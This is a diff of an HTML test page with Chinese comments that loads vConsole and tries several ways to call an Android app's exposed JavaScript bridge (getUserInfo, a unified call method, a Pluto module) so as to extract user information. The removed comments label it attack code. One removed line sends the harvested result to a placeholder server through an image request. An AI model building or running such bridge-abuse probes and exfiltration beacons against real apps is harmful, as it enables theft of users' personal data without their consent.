@@ -9,7 +9,6 @@
         button { font-size: 16px; padding: 10px; margin: 5px; cursor: pointer; }
         #status { margin-top: 20px; font-weight: bold; }
     </style>
-    <!-- 1. 引入 vConsole，这是关键！ -->
     <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
 </head>
 <body>
@@ -23,21 +22,16 @@
     <div id="status">等待操作...</div>
 
     <script>
-        // 2. 初始化 vConsole
+        // 初始化 vConsole
         var vConsole = new VConsole();
 
-        // 获取状态显示区域
         const statusDiv = document.getElementById('status');
 
-        // 使用 vConsole.log 来输出，这样能在手机上看到
+        // ✅ 修正：只调用 console.log，vConsole会自动拦截
         function log(msg) {
-            console.log(msg); // 也会输出到浏览器控制台
-            vConsole.log(msg); // 输出到 vConsole
+            console.log(msg); // vConsole会自动捕获并显示
         }
 
-        // 3. 攻击代码：尝试不同的调用方式
-
-        // 方式一：如果方法直接挂在 Android 对象下
         function testDirectCall() {
             log("--- 尝试直接调用 ---");
             if (window.Android && window.Android.getUserInfo) {
@@ -46,8 +40,6 @@
                     const result = window.Android.getUserInfo();
                     log("🎉 调用成功！返回结果: " + JSON.stringify(result));
                     statusDiv.innerText = "直接调用成功！请查看 vConsole。";
-                    // 将结果发送到你的服务器
-                    // new Image().src = 'https://your-server.com/collect?data=' + encodeURIComponent(JSON.stringify(result));
                 } catch (e) {
                     log("❌ 调用失败: " + e);
                     statusDiv.innerText = "直接调用失败。";
@@ -58,14 +50,11 @@
             }
         }
 
-        // 方式二：如果通过统一的 call 方法调用
         function testUnifiedCall() {
             log("--- 尝试统一接口调用 ---");
             if (window.Android && window.Android.call) {
                 log("✅ 发现 window.Android.call");
                 try {
-                    // 假设 call 方法的签名是 call(pluginName, params, callback)
-                    // 我们尝试调用 Pluto 模块的 getUserInfo
                     window.Android.call('getUserInfo', {}, function(result) {
                         log("🎉 调用成功！返回结果: " + JSON.stringify(result));
                         statusDiv.innerText = "统一接口调用成功！请查看 vConsole。";
@@ -80,19 +69,16 @@
             }
         }
 
-        // 方式三：针对 Pluto 模块的特定调用（基于你分析的插件名）
         function testPlutoGetUserInfo() {
-             log("--- 尝试调用 Pluto.getUserInfo ---");
-            // 这种可能性较小，但可以尝试
+            log("--- 尝试调用 Pluto.getUserInfo ---");
             if (window.Android && window.Android.Pluto && window.Android.Pluto.getUserInfo) {
-                 log("✅ 发现 window.Android.Pluto.getUserInfo");
-                 // ... 执行调用
+                log("✅ 发现 window.Android.Pluto.getUserInfo");
+                // ... 执行调用
             } else {
-                 log("❌ 未发现 window.Android.Pluto.getUserInfo");
+                log("❌ 未发现 window.Android.Pluto.getUserInfo");
             }
         }
 
-        // 页面加载时，先打印一下 window.Android 对象，看看里面有什么
         window.onload = function() {
             log("页面加载完成，开始检查 JSBridge 对象...");
             if (window.Android) {
